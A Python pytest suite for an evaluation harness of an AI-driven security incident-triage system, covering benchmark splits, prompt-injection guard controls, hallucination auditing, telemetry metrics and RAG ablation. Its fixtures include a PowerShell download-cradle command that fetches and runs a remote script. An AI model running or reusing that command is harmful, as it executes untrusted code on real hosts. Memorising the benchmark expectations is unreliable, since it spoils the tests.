# -*- coding: utf-8 -*-
"""
tests/test_eval_harness.py
Comprehensive test suite for the Phase 4 (P2) Evaluation & Benchmark Harness:
  1. 126-case stratified benchmark dataset across 5 splits (ID / OOD / Adversarial + 6 hard-benign guard controls)
  2. Zero-LLM-judge `audit_case_grounding()` catching fabricated currency/IP/lsass vs clean case
  3. `deduplicate_telemetry()` zero double-counting + exact schema compliance formulas
  4. `mcnemar_exact_test()` & `bootstrap_ci_95()` determinism (`seed=42`)
  5. Standalone 40-query `run_rag_ablation()` across `legacy_tfidf`, `bm25`, `hybrid_rrf`
  6. End-to-end CLI smoke test (`scripts/evaluate_llm_soc.py --mode deterministic --rag-ablation`)
     verifying exit 0, all 5 output files, and Tables 4.1 -> 4.6 in `thesis_report_chapter4.md`.
"""

from __future__ import annotations

import csv
import ipaddress
import json
import re
import subprocess
import sys
from collections import Counter
from datetime import datetime, timezone
from pathlib import Path

import pytest

from src.core.schemas import (
    ActionType,
    AttackCategory,
    IncidentReport,
    IncidentStatus,
    LLMCallTelemetry,
    ParsedEvent,
    RawLogInput,
    RecommendedAction,
    RootCauseAnalysis,
    SeverityLevel,
    ThreatIntelEnrichment,
    TriageOutput,
)
from src.core.security_guard import scan_incident_state_for_injections
from src.core.state import IncidentState
from src.eval import (
    BenchmarkSplit,
    BenchmarkSummary,
    CaseEvalResult,
    DEFAULT_ABLATION_CONFIGS,
    EvalConfig,
    GroundTruthLabel,
    audit_case_grounding,
    build_benchmark_dataset,
)
from src.eval.exporter import _render_thesis_markdown
from src.eval.metrics import (
    _is_offline_deterministic_call,
    _normalize_mitre_set,
    bootstrap_ci_95,
    compute_benchmark_summary,
    compute_mitre_f1,
    compute_schema_compliance_stats,
    deduplicate_telemetry,
    mcnemar_exact_test,
)
from src.eval.rag_benchmark import get_curated_rag_queries, run_rag_ablation
from src.tools.rag_embeddings import LocalCharNgramDenseProvider
from src.tools.rag_knowledge_base import RAGKnowledgeBaseTool

REPO_ROOT = Path(__file__).resolve().parent.parent


# =====================================================================
# 1. STRATIFIED 126-CASE BENCHMARK DATASET & LEAKAGE GUARDS
# =====================================================================
def test_benchmark_dataset_126_case_stratification():
    ds = build_benchmark_dataset(seed=42, base_dir=str(REPO_ROOT))
    assert len(ds) == 126

    counts = Counter(c.split for c in ds)
    assert counts[BenchmarkSplit.WAZUH_KNOWN] == 16
    assert counts[BenchmarkSplit.MORDOR_PUBLIC] == 22
    assert counts[BenchmarkSplit.LOGHUB_PUBLIC] == 18
    assert counts[BenchmarkSplit.OOD_UNSEEN] == 40
    assert counts[BenchmarkSplit.ADVERSARIAL_INJECTION] == 30

    # Unique case_ids
    case_ids = [c.case_id for c in ds]
    assert len(case_ids) == len(set(case_ids))

    # Deterministic seed wiring: same seed -> identical order; different seed -> different order
    ds_same = build_benchmark_dataset(seed=42, base_dir=str(REPO_ROOT))
    ds_other = build_benchmark_dataset(seed=1337, base_dir=str(REPO_ROOT))
    assert [c.case_id for c in ds_same] == case_ids
    assert set(c.case_id for c in ds_other) == set(case_ids)
    assert [c.case_id for c in ds_other] != case_ids

    # ID vs OOD partitioning
    for c in ds:
        if c.split in {
            BenchmarkSplit.WAZUH_KNOWN,
            BenchmarkSplit.MORDOR_PUBLIC,
            BenchmarkSplit.LOGHUB_PUBLIC,
        }:
            assert c.is_in_distribution is True
        else:
            assert c.is_in_distribution is False

    # Adversarial split language balance (10 EN, 10 VI, 10 mixed_obfuscated)
    adv = [c for c in ds if c.split == BenchmarkSplit.ADVERSARIAL_INJECTION]
    lang_counts = Counter(c.ground_truth.injection_language for c in adv)
    assert lang_counts["en"] == 10
    assert lang_counts["vi"] == 10
    assert lang_counts["mixed_obfuscated"] == 10
    assert all(c.ground_truth.is_incident is True for c in adv)
    assert all(c.ground_truth.is_adversarial_injection is True for c in adv)

    # Default ablation config keys
    assert set(DEFAULT_ABLATION_CONFIGS.keys()) == {
        "rule_only",
        "pure_llm",
        "hybrid_no_rag",
        "hybrid_full",
    }


def test_ood_benchmark_no_leakage_and_guard_controls():
    ds = build_benchmark_dataset(
        splits=[BenchmarkSplit.OOD_UNSEEN, BenchmarkSplit.ADVERSARIAL_INJECTION],
        seed=42,
        base_dir=str(REPO_ROOT),
    )
    ood = [c for c in ds if c.split == BenchmarkSplit.OOD_UNSEEN]
    by_id = {c.case_id: c for c in ood}

    # 1. No knowledge_docs OTRF overlap in OOD-CHAIN-02 / OOD-CHAIN-03
    kdoc_stems = {p.stem for p in (REPO_ROOT / "data" / "knowledge_docs").glob("*.yaml")}
    for cid in ("OOD-CHAIN-02", "OOD-CHAIN-03"):
        case = by_id[cid]
        blob = case.model_dump_json()
        for stem in kdoc_stems:
            assert stem not in blob, f"OOD case {cid} overlaps knowledge_doc {stem}"

    # 2. No 'routine' / 'authentication_success' fast-path leakage in OOD-BEN-01..08
    for idx in range(1, 9):
        cid = f"OOD-BEN-{idx:02d}"
        case = by_id[cid]
        for rl in case.raw_logs:
            payload = json.loads(rl.raw_payload)
            desc = str(payload.get("rule", {}).get("description", "")).lower()
            groups = [str(g).lower() for g in payload.get("rule", {}).get("groups", [])]
            assert "routine" not in desc, f"Fast-path 'routine' leak in {cid} raw_payload"
            assert "authentication_success" not in groups
        for ev in case.parsed_events or []:
            desc = str((ev.raw_attributes or {}).get("wazuh_rule_description", "")).lower()
            groups = [str(g).lower() for g in (ev.raw_attributes or {}).get("wazuh_groups", [])]
            assert "routine" not in desc, f"Fast-path 'routine' leak in {cid} parsed_events"
            assert "authentication_success" not in groups

    # 3. No RFC 5737 TEST-NET private IPs in OOD/Adversarial benchmarks; OOD-LOL-02 & OOD-LOL-12 use public external C2 IPs
    rfc5737_re = re.compile(r"\b(?:192\.0\.2|198\.51\.100|203\.0\.113)\.\d{1,3}\b")
    for c in ds:
        assert not rfc5737_re.search(c.model_dump_json()), f"RFC 5737 IP found in {c.case_id}"
    for cid in ("OOD-LOL-02", "OOD-LOL-12"):
        dest_ip = by_id[cid].parsed_events[0].dest_ip
        assert dest_ip is not None
        assert not ipaddress.ip_address(dest_ip).is_private

    # 4. 6 hard-benign SecurityGuard control cases exist and produce 0% Guard FPR
    ctrl_cases = [
        c for c in ood if c.metadata.get("ood_group") == "hard_benign_guard_control"
    ]
    assert len(ctrl_cases) == 6
    for c in ctrl_cases:
        assert c.ground_truth.is_incident is False
        assert c.ground_truth.is_adversarial_injection is False
        st = IncidentState(
            incident_id=c.case_id,
            raw_logs=list(c.raw_logs),
            parsed_events=list(c.parsed_events or []),
        )
        assert scan_incident_state_for_injections(st) == [], (
            f"Hard-benign control {c.case_id} triggered SecurityGuard false positive"
        )


# =====================================================================
# 2. GROUNDING & HALLUCINATION AUDITOR
# =====================================================================
def _make_base_incident_state() -> IncidentState:
    return IncidentState(
        incident_id="INC-GROUND-01",
        status=IncidentStatus.RESOLVED,
        raw_logs=[
            RawLogInput(
                log_source="WazuhSIEM",
                raw_payload="powershell.exe -NoP -c IEX http://185.220.101.5/p.ps1",
                collected_at=datetime.now(timezone.utc),
            )
        ],
        parsed_events=[
            ParsedEvent(
                event_id="1",
                source_type="Sysmon",
                host_name="CORP-WS-01",
                user_name="CORP\\alice",
                process_name="powershell.exe",
                command_line="powershell.exe -NoP -c IEX http://185.220.101.5/p.ps1",
                dest_ip="185.220.101.5",
                raw_attributes={"pid": "4242"},
            )
        ],
        triage_result=TriageOutput(
            is_incident=True,
            confidence_score=0.95,
            severity=SeverityLevel.HIGH,
            summary="Phát hiện powershell.exe (PID 4242) kết nối IP 185.220.101.5.",
            attack_category=AttackCategory.MALWARE,
        ),
        threat_intel=ThreatIntelEnrichment(
            mitre_techniques=["T1059.001"],
            enrichment_summary="C2 IP 185.220.101.5",
        ),
        rca_result=RootCauseAnalysis(
            initial_access_vector="PowerShell download cradle",
            root_cause_summary="powershell.exe tải payload từ 185.220.101.5 (T1059.001).",
        ),
        recommended_actions=[
            RecommendedAction(
                action_type=ActionType.BLOCK_IP,
                target="185.220.101.5",
                description="Block C2 IP",
                priority=1,
            )
        ],
    )


def test_grounding_audit_clean_vs_fabricated():
    clean_state = _make_base_incident_state()
    clean_state.final_report = IncidentReport(
        report_id="RPT-CLEAN-01",
        incident_title="[HIGH] PowerShell C2 Incident",
        executive_summary="Sự cố mức độ HIGH trên powershell.exe kết nối 185.220.101.5 (T1059.001).",
        detailed_findings="Tiến trình powershell.exe (PID 4242) thực thi kỹ thuật T1059.001.",
        severity="HIGH",
        mitre_attack_matrix_mapping=["T1059.001"],
    )
    clean_res = audit_case_grounding(clean_state)
    assert clean_res.has_hallucination is False
    assert clean_res.grounding_rate == 1.0
    assert clean_res.forbidden_fabrications == []
    assert clean_res.ungrounded_entities == []

    # Now inject fabricated money, internal IP 172.16.65.143, and lsass.exe
    dirty_state = _make_base_incident_state()
    dirty_state.final_report = IncidentReport(
        report_id="RPT-DIRTY-01",
        incident_title="[HIGH] Fabricated Report",
        executive_summary=(
            "Thiệt hại ước tính 450 triệu đồng tại máy chủ 172.16.65.143, "
            "phát hiện lsass.exe bị trích xuất bởi evil_dropper.exe."
        ),
        detailed_findings="Liên hệ IP bịa đặt 203.0.113.99 trong payload.",
        severity="HIGH",
        mitre_attack_matrix_mapping=["T1059.001"],
    )
    dirty_res = audit_case_grounding(dirty_state)
    assert dirty_res.has_hallucination is True
    assert dirty_res.grounding_rate < 1.0
    assert any("450 triệu" in f for f in dirty_res.forbidden_fabrications)
    assert any("172.16.65.143" in f for f in dirty_res.forbidden_fabrications)
    assert any("lsass.exe" in f for f in dirty_res.forbidden_fabrications)
    ungrounded_vals = {u["value"] for u in dirty_res.ungrounded_entities}
    assert "172.16.65.143" in ungrounded_vals
    assert "203.0.113.99" in ungrounded_vals
    assert "evil_dropper.exe" in ungrounded_vals


# =====================================================================
# 3. TELEMETRY DEDUPLICATION & SCHEMA COMPLIANCE FORMULAS
# =====================================================================
def test_deduplicate_telemetry_and_schema_compliance():
    c1 = LLMCallTelemetry(
        call_id="CALL-001",
        agent_name="TriageAgent",
        provider_used="omnirouter",
        model="fast-model",
        prompt_tokens=100,
        completion_tokens=50,
        structured_attempts=1,
        schema_valid=True,
        schema_name="TriageLLMResult",
    )
    c2 = LLMCallTelemetry(
        call_id="CALL-002",
        agent_name="RCAAgent",
        provider_used="omnirouter",
        model="reasoning-model",
        prompt_tokens=200,
        completion_tokens=100,
        structured_attempts=2,
        self_corrected=True,
        schema_valid=True,
        schema_name="RCALLMAnalysis",
    )
    c3 = LLMCallTelemetry(
        call_id="CALL-003",
        agent_name="ResponseAgent",
        provider_used="deterministic",
        model="Deterministic-CoT",
        prompt_tokens=80,
        completion_tokens=40,
        structured_attempts=2,
        self_corrected=True,
        schema_valid=False,
        schema_name="ResponseLLMStrategy",
        fallback_reason="self_correction_failed",
    )
    c4_skipped = LLMCallTelemetry(
        call_id="CALL-004",
        agent_name="TriageAgent",
        provider_used="skipped_tiered",
        model="Tiered-Fast-Heuristic",
        prompt_tokens=0,
        completion_tokens=0,
        schema_name=None,
    )

    # Duplicate c1 and c2 intentionally to verify zero double-counting
    deduped = deduplicate_telemetry([c1, c2, c1, c3, c2, c4_skipped])
    ids = [e.call_id for e in deduped]
    assert len(ids) == 4
    assert len(ids) == len(set(ids))

    stats = compute_schema_compliance_stats([c1, c2, c1, c3, c2, c4_skipped])
    # Zero double-counting of tokens: 150 + 300 + 120 + 0 = 570
    assert stats["prompt_tokens"] == 380
    assert stats["completion_tokens"] == 190
    assert stats["total_tokens"] == 570
    assert stats["llm_calls_count"] == 3  # excludes skipped_tiered
    assert stats["live_llm_calls_count"] == 2  # excludes deterministic & skipped_tiered
    assert stats["structured_calls_count"] == 3
    # first_pass_valid_rate: c1 only -> 1/3
    assert stats["first_pass_valid_rate"] == pytest.approx(1 / 3, abs=1e-4)
    # self_correction_recovery_rate: c2 (True) / [c2, c3] -> 1/2 = 0.5
    assert stats["self_correction_recovery_rate"] == pytest.approx(0.5, abs=1e-4)
    # final_schema_compliance_rate: [c1, c2] (valid and != deterministic) / 3 -> 2/3
    assert stats["final_schema_compliance_rate"] == pytest.approx(2 / 3, abs=1e-4)


def test_offline_deterministic_excluded_from_schema_compliance_while_preserving_tokens():
    offline_triage = LLMCallTelemetry(
        call_id="DET-001",
        agent_name="TriageAgent",
        provider_used="deterministic",
        model="Deterministic-CoT",
        prompt_tokens=120,
        completion_tokens=30,
        structured_attempts=1,
        schema_valid=True,
        schema_name="TriageLLMResult",
        fallback_reason="provider_mode=deterministic",
    )
    offline_rca = LLMCallTelemetry(
        call_id="DET-002",
        agent_name="RCAAgent",
        provider_used="deterministic",
        model="Deterministic-CoT",
        prompt_tokens=200,
        completion_tokens=50,
        structured_attempts=1,
        schema_valid=True,
        schema_name="RCALLMAnalysis",
        fallback_reason=" provider_mode=deterministic ",
    )
    skipped = LLMCallTelemetry(
        call_id="SKIP-001",
        agent_name="TriageAgent",
        provider_used="skipped_tiered",
        model="Tiered-Fast-Heuristic",
        prompt_tokens=0,
        completion_tokens=0,
        schema_name=None,
    )
    live_ok = LLMCallTelemetry(
        call_id="LIVE-001",
        agent_name="TriageAgent",
        provider_used="omnirouter",
        model="fast-model",
        prompt_tokens=100,
        completion_tokens=40,
        structured_attempts=1,
        schema_valid=True,
        schema_name="TriageLLMResult",
    )
    live_fallback_fail = LLMCallTelemetry(
        call_id="LIVE-FAIL-001",
        agent_name="ResponseAgent",
        provider_used="deterministic",
        model="Deterministic-CoT",
        prompt_tokens=80,
        completion_tokens=20,
        structured_attempts=2,
        self_corrected=True,
        schema_valid=False,
        schema_name="ResponseLLMStrategy",
        fallback_reason="self_correction_failed",
    )

    assert _is_offline_deterministic_call(offline_triage) is True
    assert _is_offline_deterministic_call(offline_rca) is True
    assert _is_offline_deterministic_call(live_ok) is False
    assert _is_offline_deterministic_call(live_fallback_fail) is False

    offline_stats = compute_schema_compliance_stats([offline_triage, offline_rca, skipped])
    assert offline_stats["llm_calls_count"] == 2
    assert offline_stats["live_llm_calls_count"] == 0
    assert offline_stats["structured_calls_count"] == 0
    assert offline_stats["offline_deterministic_structured_calls"] == 2
    assert offline_stats["first_pass_valid_rate"] == 0.0
    assert offline_stats["self_correction_recovery_rate"] == 0.0
    assert offline_stats["final_schema_compliance_rate"] == 0.0
    assert offline_stats["prompt_tokens"] == 320
    assert offline_stats["completion_tokens"] == 80
    assert offline_stats["total_tokens"] == 400

    # Mixed run: offline deterministic call excluded from compliance denominator,
    # while live self_correction_failed fallback remains counted (1/2 = 0.5).
    mixed_stats = compute_schema_compliance_stats(
        [offline_triage, live_ok, live_fallback_fail]
    )
    assert mixed_stats["llm_calls_count"] == 3
    assert mixed_stats["live_llm_calls_count"] == 1
    assert mixed_stats["structured_calls_count"] == 2
    assert mixed_stats["offline_deterministic_structured_calls"] == 1
    assert mixed_stats["first_pass_valid_rate"] == pytest.approx(0.5, abs=1e-4)
    assert mixed_stats["self_correction_recovery_rate"] == pytest.approx(0.0, abs=1e-4)
    assert mixed_stats["final_schema_compliance_rate"] == pytest.approx(0.5, abs=1e-4)
    assert mixed_stats["total_tokens"] == 390

    # BenchmarkSummary aggregation must mirror compute_schema_compliance_stats
    gt = GroundTruthLabel(
        is_incident=True,
        expected_severity=SeverityLevel.HIGH,
        expected_attack_category=AttackCategory.MALWARE,
    )
    case_res = CaseEvalResult(
        case_id="CASE-DET-1",
        split=BenchmarkSplit.WAZUH_KNOWN,
        config_id="pure_llm",
        ground_truth=gt,
        predicted_is_incident=True,
        predicted_severity=SeverityLevel.HIGH,
        predicted_attack_category=AttackCategory.MALWARE,
        telemetry=[offline_triage, offline_rca],
        llm_calls_count=offline_stats["llm_calls_count"],
        live_llm_calls_count=offline_stats["live_llm_calls_count"],
        structured_calls_count=offline_stats["structured_calls_count"],
        prompt_tokens=offline_stats["prompt_tokens"],
        completion_tokens=offline_stats["completion_tokens"],
        total_tokens=offline_stats["total_tokens"],
    )
    summary = compute_benchmark_summary(
        "run-det",
        EvalConfig(config_id="pure_llm", label="Pure LLM", provider_mode="deterministic"),
        [case_res],
        n_bootstrap=10,
    )
    assert summary.llm_calls_count == 2
    assert summary.live_llm_calls_count == 0
    assert summary.structured_calls_count == 0
    assert summary.total_tokens == 400
    assert summary.first_pass_valid_rate == 0.0
    assert summary.self_correction_recovery_rate == 0.0
    assert summary.final_schema_compliance_rate == 0.0


def test_render_thesis_markdown_table_4_4_na_when_no_structured_calls():
    summaries = {
        "rule_only": BenchmarkSummary(
            run_id="r1",
            config_id="rule_only",
            label="Rule-Only",
            llm_calls_count=0,
            live_llm_calls_count=0,
            structured_calls_count=0,
        ),
        "pure_llm": BenchmarkSummary(
            run_id="r1",
            config_id="pure_llm",
            label="Pure LLM",
            llm_calls_count=12,
            live_llm_calls_count=0,
            structured_calls_count=0,
            total_tokens=1500,
        ),
        "hybrid_live": BenchmarkSummary(
            run_id="r1",
            config_id="hybrid_live",
            label="Hybrid Live",
            llm_calls_count=10,
            live_llm_calls_count=10,
            structured_calls_count=10,
            first_pass_valid_rate=0.8,
            self_correction_recovery_rate=0.5,
            final_schema_compliance_rate=0.9,
        ),
    }

    md = _render_thesis_markdown(
        summaries,
        dataset=[],
        rag_ablation=None,
        provenance={"mode": "deterministic", "seed": 42},
    )
    t44_section = md.split("## Bảng 4.4", 1)[1].split("## Bảng 4.5", 1)[0]
    row_by_cfg = {}
    for line in t44_section.splitlines():
        if line.startswith("| `"):
            cfg = line.split("`")[1]
            row_by_cfg[cfg] = line

    assert row_by_cfg["rule_only"].endswith("| 0 | N/A | N/A | N/A |")
    assert row_by_cfg["pure_llm"].endswith("| 0 | N/A (offline) | N/A (offline) | N/A (offline) |")
    assert row_by_cfg["hybrid_live"].endswith("| 10 | 80.00% | 50.00% | 90.00% |")


def test_mitre_f1_ignores_tactic_names_and_evaluates_technique_ids_only():
    raw_preds = [
        "t1059.001",
        "T1082",
        "EXECUTION",
        "INITIAL ACCESS",
        "DEFENSE EVASION",
        "CREDENTIAL ACCESS",
        "TA0002",
        " ",
    ]
    assert _normalize_mitre_set(raw_preds, base_only=False) == {"T1059.001", "T1082"}
    assert _normalize_mitre_set(raw_preds, base_only=True) == {"T1059", "T1082"}

    gt_attack = GroundTruthLabel(
        is_incident=True,
        expected_severity=SeverityLevel.HIGH,
        expected_attack_category=AttackCategory.MALWARE,
        expected_mitre_ids=["T1059.001", "T1082"],
    )
    gt_benign = GroundTruthLabel(
        is_incident=False,
        expected_severity=SeverityLevel.LOW,
        expected_attack_category=AttackCategory.BENIGN,
        expected_mitre_ids=[],
    )
    cases = [
        CaseEvalResult(
            case_id="MITRE-1",
            split=BenchmarkSplit.MORDOR_PUBLIC,
            config_id="hybrid_full",
            ground_truth=gt_attack,
            predicted_is_incident=True,
            predicted_mitre_ids=raw_preds,
        ),
        CaseEvalResult(
            case_id="MITRE-2",
            split=BenchmarkSplit.WAZUH_KNOWN,
            config_id="hybrid_full",
            ground_truth=gt_benign,
            predicted_is_incident=False,
            predicted_mitre_ids=["DISCOVERY", "COLLECTION"],
        ),
    ]

    exact_micro, exact_macro = compute_mitre_f1(cases, base_only=False)
    base_micro, base_macro = compute_mitre_f1(cases, base_only=True)
    assert exact_micro == pytest.approx(1.0, abs=1e-4)
    assert exact_macro == pytest.approx(1.0, abs=1e-4)
    assert base_micro == pytest.approx(1.0, abs=1e-4)
    assert base_macro == pytest.approx(1.0, abs=1e-4)


# =====================================================================
# 4. STATISTICAL TESTS (MCNEMAR & BOOTSTRAP 95% CI DETERMINISM)
# =====================================================================
def test_mcnemar_and_bootstrap_determinism():
    y_true = [True] * 20 + [False] * 20
    # Model A gets 10 wrong; Model B fixes 9 of them and misses 0 others -> n01=9, n10=0
    pred_a = [True] * 15 + [False] * 5 + [True] * 5 + [False] * 15
    pred_b = [True] * 20 + [True] * 1 + [False] * 19

    res = mcnemar_exact_test(y_true, pred_a, pred_b)
    assert res["n01"] == 9.0
    assert res["n10"] == 0.0
    assert res["n_discordant"] == 9.0
    # Exact two-sided binomial: 2 * (0.5 ** 9) = 2 / 512 = 0.00390625
    assert res["p_value"] == pytest.approx(2.0 / 512.0, abs=1e-6)
    assert res["significant_0_05"] == 1.0

    # Bootstrap CI determinism with seed=42
    vals = [0.8, 0.9, 0.85, 0.95, 0.88, 0.92, 0.84, 0.91]
    ci_1 = bootstrap_ci_95(lambda xs: sum(xs) / len(xs), vals, seed=42, n_resamples=500)
    ci_2 = bootstrap_ci_95(lambda xs: sum(xs) / len(xs), vals, seed=42, n_resamples=500)
    assert ci_1 == ci_2
    assert 0.8 <= ci_1[0] <= ci_1[1] <= 0.95


# =====================================================================
# 5. STANDALONE RAG ABLATION (LEGACY TF-IDF vs BM25 vs HYBRID RRF)
# =====================================================================
def test_rag_ablation_benchmark():
    queries = get_curated_rag_queries()
    assert len(queries) == 40
    langs = Counter(q.language for q in queries)
    assert langs["en"] >= 10
    assert langs["vi"] >= 10
    assert langs["ood_log"] >= 10

    kb = RAGKnowledgeBaseTool(
        auto_sync_docs=False,
        embedding_provider=LocalCharNgramDenseProvider(),
    )
    report = run_rag_ablation(rag_kb=kb, queries=queries, offline_only=True)
    assert report.total_queries == 40
    assert set(report.variants.keys()) == {"legacy_tfidf", "bm25", "hybrid_rrf"}
    for mode, metrics in report.variants.items():
        assert 0.0 <= metrics.hit_at_1 <= metrics.hit_at_3 <= 1.0
        assert 0.0 <= metrics.mrr_at_5 <= 1.0
        assert 0.0 <= metrics.ndcg_at_5 <= 1.0
        assert metrics.mean_latency_ms >= 0.0
    # Hybrid RRF and BM25 should improve or match Legacy TF-IDF on Vietnamese + overall
    assert report.variants["hybrid_rrf"].hit_at_1 >= report.variants["legacy_tfidf"].hit_at_1
    assert report.variants["bm25"].by_language["vi"]["hit_at_1"] >= report.variants["legacy_tfidf"].by_language["vi"]["hit_at_1"]


# =====================================================================
# 6. END-TO-END CLI SMOKE TEST (DETERMINISTIC + REPLAY)
# =====================================================================
def test_cli_end_to_end_deterministic_smoke(tmp_path: Path):
    out_dir = tmp_path / "eval_out"
    trace_dir = tmp_path / "traces"
    cmd = [
        sys.executable,
        str(REPO_ROOT / "scripts" / "evaluate_llm_soc.py"),
        "--mode",
        "deterministic",
        "--configs",
        "rule_only,pure_llm,hybrid_no_rag,hybrid_full",
        "--rag-ablation",
        "--save-traces",
        "--trace-dir",
        str(trace_dir),
        "--seed",
        "42",
        "--output-dir",
        str(out_dir),
    ]
    proc = subprocess.run(cmd, cwd=str(REPO_ROOT), capture_output=True, text=True, check=False)
    assert proc.returncode == 0, f"CLI failed:\nSTDOUT:\n{proc.stdout}\nSTDERR:\n{proc.stderr}"

    expected_files = [
        "raw_results.json",
        "summary_comparison.csv",
        "per_split_breakdown.csv",
        "rag_ablation.csv",
        "thesis_report_chapter4.md",
    ]
    for fname in expected_files:
        fpath = out_dir / fname
        assert fpath.exists(), f"Missing deliverable {fpath}"
        assert fpath.stat().st_size > 0

    raw = json.loads((out_dir / "raw_results.json").read_text(encoding="utf-8"))
    assert set(raw["summaries"].keys()) == {
        "rule_only",
        "pure_llm",
        "hybrid_no_rag",
        "hybrid_full",
    }
    assert raw["summaries"]["hybrid_full"]["total_cases"] == 126
    assert raw["summaries"]["hybrid_full"]["adversarial_total"] == 30
    assert raw["summaries"]["hybrid_full"]["injection_block_rate"] == 1.0
    assert raw["summaries"]["hybrid_full"]["adversarial_asr"] == 0.0
    assert raw["summaries"]["hybrid_full"]["guard_false_positive_rate"] == 0.0
    assert raw["summaries"]["pure_llm"]["structured_calls_count"] == 0
    assert raw["summaries"]["pure_llm"]["llm_calls_count"] > 0
    assert raw["summaries"]["pure_llm"]["total_tokens"] > 0
    assert raw["summaries"]["hybrid_full"]["structured_calls_count"] == 0

    # Verify CSVs parse cleanly
    with (out_dir / "summary_comparison.csv").open("r", encoding="utf-8") as f:
        sum_rows = list(csv.DictReader(f))
    assert len(sum_rows) == 4

    with (out_dir / "rag_ablation.csv").open("r", encoding="utf-8") as f:
        rag_rows = list(csv.DictReader(f))
    assert len(rag_rows) == 3

    # Verify Tables 4.1 -> 4.6 exist in thesis_report_chapter4.md
    md = (out_dir / "thesis_report_chapter4.md").read_text(encoding="utf-8")
    for tbl_idx in range(1, 7):
        assert f"Bảng 4.{tbl_idx}" in md
        assert f"Table 4.{tbl_idx}" in md

    t44_section = md.split("## Bảng 4.4", 1)[1].split("## Bảng 4.5", 1)[0]
    assert "| 0 | N/A | N/A | N/A |" in t44_section
    assert "| 0 | N/A (offline) | N/A (offline) | N/A (offline) |" in t44_section

    # Verify --mode replay reproduces identical summary F1 & tokens from saved traces
    replay_dir = tmp_path / "replay_out"
    replay_cmd = [
        sys.executable,
        str(REPO_ROOT / "scripts" / "evaluate_llm_soc.py"),
        "--mode",
        "replay",
        "--rag-ablation",
        "--trace-dir",
        str(trace_dir),
        "--seed",
        "42",
        "--output-dir",
        str(replay_dir),
    ]
    rproc = subprocess.run(
        replay_cmd, cwd=str(REPO_ROOT), capture_output=True, text=True, check=False
    )
    assert rproc.returncode == 0, f"Replay failed:\n{rproc.stderr}"
    replay_raw = json.loads((replay_dir / "raw_results.json").read_text(encoding="utf-8"))
    assert replay_raw["summaries"]["hybrid_full"]["f1"] == raw["summaries"]["hybrid_full"]["f1"]
    assert (
        replay_raw["summaries"]["hybrid_full"]["total_tokens"]
        == raw["summaries"]["hybrid_full"]["total_tokens"]
    )
